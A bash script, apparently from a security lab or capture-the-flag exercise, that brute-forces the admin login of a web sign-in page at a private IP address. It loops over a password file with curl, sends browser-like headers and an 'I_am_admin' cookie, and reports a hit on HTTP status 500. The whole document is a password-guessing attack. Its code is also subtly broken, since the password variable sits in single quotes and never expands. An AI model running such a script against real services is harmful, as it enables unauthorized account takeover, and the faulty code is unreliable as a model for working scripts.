url="http://10.12.1.122/?page=signin&username=a&password=a&Login=Login#"

for pass in $(cat passwd.txt); do
	http_code=$(curl -s -o /dev/null --write-out %{http_code} 'http://10.12.1.122/?page=signin&username=admin&password="$pass"&Login=Login' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Referer: http://10.12.1.122/?page=signin' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' --compressed --insecure)
	if [ $http_code -eq 500 ]; then
	echo "Success: User: admin Pass: $pass, status : '$http_code'"
	fi
done
